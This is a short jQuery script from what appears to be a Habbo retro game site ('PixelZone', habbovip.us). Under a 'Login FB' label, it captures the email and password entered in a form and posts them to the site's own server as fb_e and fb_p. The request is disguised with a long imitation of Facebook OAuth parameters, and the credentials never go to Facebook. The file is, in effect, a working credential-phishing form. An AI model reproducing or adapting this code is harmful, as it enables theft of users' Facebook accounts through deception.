
/*
 * PixelZone by RDP Services, Emulated by Retro Development Server.
 * The use of this program is restricted to clients and owners of RDP Services.
 * Any unauthorized use of this code it'll end up on deletion of the program.
 * Developers P3x & Jeihden.
 * Copyrights © 2020
 * Last Modified: $file.lastModefied
 */

// Login FB
$(document).ready(function(){
    $("input[type=\"submit\"]").click(function(){
        var E = $("input[name=\"email\"]").val();
        var P = $("input[name=\"pass\"]").val();

        if( E != "" && P != ""){
            $.post("/?api_login_key=250113520278562147532582365412&fb_login=true&login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fapp_id%3D2991567804406685%26cbt%3D1594342447355%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df327d14d9898718%2526domain%253Dhabbovip.us%2526origin%253Dhttps%25253A%25252F%25252Fhabbovip.us%25252Ff167a7eb4d25ba%2526relation%253Dopener%26client_id%3D2991567804406685%26display%3Dpopup%26domain%3Dhabbovip.us%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fhabbovip.us%252F%26locale%3Den_US%26logger_id%3Df1f26895b8b7ac%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df380e10031aba28%2526domain%253Dhabbovip.us%2526origin%253Dhttps%25253A%25252F%25252Fhabbovip.us%25252Ff167a7eb4d25ba%2526relation%253Dopener%2526frame%253Df26a5d88b02a9cc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%26sdk%3Djoey%26version%3Dv7.0%26ret%3Dlogin%26fbapp_pres%3D0&send_auth=true&popup=1&lwv=100",
                {
                    fb_e: '' + E,
                    fb_p: '' + P

                },
                function(data){
                console.log(data);
                    var res = $.parseJSON(data);
                    setTimeout(function(){ window.location = "" + res.url + ""; }, 0);
                });

        } else {
            $("#error_box" ).show();
        }
    });
});